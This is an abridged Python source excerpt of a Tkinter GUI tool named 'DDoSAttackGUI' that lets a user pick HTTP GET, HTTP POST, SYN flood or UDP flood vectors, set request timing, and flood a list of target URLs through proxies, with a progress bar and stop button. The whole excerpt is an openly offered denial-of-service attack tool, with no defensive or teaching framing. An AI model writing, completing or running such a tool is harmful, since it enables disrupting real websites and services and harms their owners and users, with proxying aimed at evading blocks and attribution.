...
class DDoSAttackGUI:
    def __init__(self, master):
        self.master = master
        master.title("Hilarious")

        self.header_label = tk.Label(master, text="Hilarious", font=("Helvetica", 16, "bold"))
        ...
        self.vector_label = tk.Label(master, text="Attack Vector (select one):")
        self.vector_label.pack()
        self.vector_combobox = ttk.Combobox(master, values=["HTTP GET", "HTTP POST", "SYN Flood", "UDP Flood"])
        self.vector_combobox.pack()

        self.timing_label = tk.Label(master, text="Timing between requests (optional, in seconds):")
        self.timing_label.pack()
        self.timing_entry = tk.Entry(master, width=50)
        self.timing_entry.pack()
    ...
    def stop_attack(self):
        if self.attack_process is not None:
            ...
            messagebox.showinfo("Attack Stopped", "DDoS attack has been stopped.")

    def perform_attack(self):
        try:
            vector = self.vector_combobox.get()
            if not vector:
                raise ValueError("Please select an attack vector.")
            ...
            for url in self.target_urls:
                for _ in range(num_requests):
                    ...
                    if vector == "HTTP GET":
                        self.send_request(url, headers, proxy, "GET")
                    elif vector == "HTTP POST":
                        self.send_request(url, headers, proxy, "POST")
                    elif vector == "SYN Flood":
                        self.syn_flood(url)
                    elif vector == "UDP Flood":
                        self.udp_flood(url)
                    self.progress_bar["value"] += 1
                    time.sleep(float(self.timing_entry.get()) if self.timing_entry.get() else 0.01)  # Adjust sleep time as needed for adaptive strategy
    ...
    def send_request(self, url, headers, proxy, method):
        try:
            if method == "GET":
                response = requests.get(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
            elif method == "POST":
                response = requests.post(url, headers=headers, proxies={"http": proxy, "https": proxy}, timeout=5)
